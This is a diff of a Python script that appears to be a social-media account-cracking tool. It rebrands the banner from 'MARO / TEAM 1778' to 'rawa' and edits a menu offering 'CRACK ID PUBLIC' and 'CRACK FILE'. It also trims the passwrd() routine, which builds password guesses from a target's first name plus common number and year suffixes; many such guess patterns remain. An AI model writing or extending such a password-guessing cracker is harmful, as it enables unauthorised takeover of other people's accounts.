@@ -145,26 +145,16 @@ def banner():
 	print(f'''\t{M} 
 
 \033[1;92mMARO\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m1778
-
-███╗   ███╗ █████╗ ██████╗  ██████╗ 
-████╗ ████║██╔══██╗██╔══██╗██╔═══██╗
-██╔████╔██║███████║██████╔╝██║   ██║
-██║╚██╔╝██║██╔══██║██╔══██╗██║   ██║
-██║ ╚═╝ ██║██║  ██║██║  ██║╚██████╔╝
-╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
-
-\033[1;92 [════════════════════════════════════════════\x1b[1;92mTEAM 1778
-
-\33[0;92m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-\33[0;92m█ \033[1;31mTELEGRAM : i4m_maro
-\33[0;92m█ \033[1;34mCHANNALL : TEAM_1778
-\33[0;92m█ \033[0;37mGITHUB   : maro-hacker
-\33[0;92m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
-
+◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️
+◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+[◼️]TOOL NEW 😍💥
+[◼️]VERZON 1V
+[◼️]TOOL BY RAWA
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬1778▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
 \033[1;92\x1b[1;90m════════════════════════════════════════════\x1b[1;92mTEAM 1778
-	  {m}▪︎{k}▪︎{h}▪︎{sir}  MARO {x}{m}▪︎{k}▪︎{h}▪︎{x}
+	  {m}▪︎{k}▪︎{h}▪︎{sir}  rawa {x}{m}▪︎{k}▪︎{h}▪︎{x}
 
 			''')
 #--------------------[ BAGIAN-MASUK ]--------------#
@@ -265,7 +255,7 @@ def menu(my_name,my_id):
 	print('\x1b[92;1m【 1 】 CRACK ID PUBLIC')
 	print('\x1b[92;1m【 2 】 CRACK FILE')
 	print('\x1b[92;1m【 0 】 LOG OUT')
-	_____alvino__adijaya_____ = input('\n ➟ Halbzhera :  ')
+	_____alvino__adijaya_____ = input('\n ➟ Halbzhera V3💥  :  ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
 	elif _____alvino__adijaya_____ in ['2']:
@@ -687,19 +677,7 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'2004')
-					pwv.append(frs+'2003')
-					pwv.append(frs+'2002')
-					pwv.append(frs+'2001')
-					pwv.append(frs+'2000')
-					pwv.append(frs+'123456789')
-					pwv.append(frs+'1234567890')
-					pwv.append('123'+frs+'123')
-					pwv.append('1234'+frs+'1234')
-					pwv.append('1235'+frs+'1235')
-					pwv.append('123'+frs)
+					
 					pwv.append('12345'+frs)
 					pwv.append('1234'+frs)
 					pwv.append('12345'+frs+frs)
@@ -710,20 +688,6 @@ def passwrd():
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'2004')
-					pwv.append(frs+'2003')
-					pwv.append(frs+'2002')
-					pwv.append(frs+'2001')
-					pwv.append(frs+'2000')
-					pwv.append(frs+'123456789')
-					pwv.append(frs+'1234567890')
-					pwv.append('123'+frs+'123')
-					pwv.append('1234'+frs+'1234')
-					pwv.append('1235'+frs+'1235')
-					pwv.append('123'+frs)
 					pwv.append('12345'+frs)
 					pwv.append('1234'+frs)
 					pwv.append('12345'+frs+frs)
